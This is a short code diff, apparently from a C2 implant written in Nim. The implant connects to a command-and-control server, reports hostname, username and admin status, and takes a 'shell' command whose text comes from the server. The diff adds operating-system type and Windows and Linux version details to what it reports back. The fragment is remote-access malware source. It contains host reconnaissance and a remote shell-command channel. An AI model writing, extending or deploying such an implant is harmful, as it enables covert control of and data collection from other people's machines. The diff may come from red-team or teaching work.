@@ -9,6 +9,13 @@ var client: Socket = newSocket()
 const port {.intdefine.}: int = 1234
 const ip {.strdefine.}: string = "127.0.0.1"
 
+when defined(linux):
+    const osType = "linux"
+elif defined(windows):
+    const osType = "windows"
+else:
+    const osType = "unknown"
+
 proc receiveCommands(client: Socket) =
   client.connectToC2()
   while true:
@@ -29,7 +36,10 @@ proc receiveCommands(client: Socket) =
         taskId,
         hostname=hostname(),
         username=username(), 
-        isAdmin=areWeAdmin()
+        isAdmin=areWeAdmin(),
+        osType=osType,
+        windowsVersionInfo=getwindowosinfo(),
+        linuxVersionInfo=getlinuxosinfo()
       )
     of "shell": 
       let toExec = jsonNode["data"]["shellCmd"].getStr()
